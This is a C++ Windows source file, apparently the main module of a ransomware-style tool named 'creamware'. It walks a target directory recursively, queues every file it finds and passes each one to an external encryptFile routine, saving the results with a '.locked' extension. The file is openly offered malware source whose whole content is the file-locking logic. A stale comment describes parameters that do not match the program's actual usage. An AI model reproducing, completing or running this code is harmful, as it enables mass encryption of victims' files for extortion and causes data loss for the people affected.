#include "encryptor.h"
#include <shlwapi.h>
#include <queue>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

void CloseHandleLog(HANDLE h, const std::string& name) {
    ::CloseHandle(h);
    std::cerr << " [LOG] Handler <" << name << "> closed OK." << std::endl;
}

void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& results)
{
    std::wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    if (search_handle != INVALID_HANDLE_VALUE)
    {
        std::vector<std::wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            tmp = directory + L"\\" + std::wstring(file.cFileName);
            wcout << tmp << endl;
            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
                //wcout << "pushed " << tmp.c_str() << endl;
                results.push(tmp);
            }

            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                directories.push_back(tmp);
        } while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
            FindFile(*iter, ext, results);

        //std::wcout << tmp << std::endl;
    }
}
//params: <input file> <output file> <is decrypt mode> <key>
int wmain(int argc, wchar_t* argv[])
{

    const wchar_t* help =
        L"[*] This is  manpage\n"
        L"[+] usage: creamware <dirpath>";

    if (argc <= 1) {
        wcout << help;
        return 0;
    }

    const wchar_t* directoryPath = argv[1];

    queue<wstring> results;
    FindFile(directoryPath, L"", results);

    wstring(fileName);
    wstring(newFileName);
    while (results.size()) {
        fileName = results.front();
        newFileName = (fileName + L".locked");

        wcout << "[*] Encrypting " << fileName;
        wcout << "to " << newFileName << endl;
        encryptFile(fileName.c_str(), newFileName.c_str(), false);

        results.pop();
        wcout << fileName << endl;
    }
    return 0;
}
